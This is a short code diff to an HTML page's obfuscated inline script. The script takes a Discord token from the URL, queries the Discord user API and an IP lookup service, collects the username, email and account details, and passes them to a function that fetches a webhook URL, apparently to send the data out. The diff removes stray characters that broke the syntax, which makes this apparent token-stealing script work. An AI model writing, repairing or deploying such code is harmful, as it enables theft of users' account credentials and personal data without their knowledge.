@@ -43,7 +43,7 @@
   <script>
     const _0x1a2b = ['parse', 'json', 'Authorization', 'Bearer ', 'https://discord.com/api/v10/users/@me', 'GET', 'Content-Type', 'application/json', 'https://api.ipify.org?format=json', 'ip', 'POST', 'username', 'email', 'premium_type', 'avatar', 'display_name', 'global_name'];
     
-    async function processUserData() {）
+    async function processUserData() {
       const _0x3c4d = new URLSearchParams(window.location.search);
       const _0x5e6f = _0x3c4d.get('token');
       const _0x7g8h = _0x3c4d.get('ua') || navigator.userAgent;
@@ -85,7 +85,6 @@
       }
     }
     
-）
     async function transferUserData(_0x1k2l, _0x7q8r, _0x5e6f) {
       const _0x9s0t = await fetch('/api/get-webhook-url');
       const { webhookUrl } = await _0x9s0t[_0x1a2b[1]]();
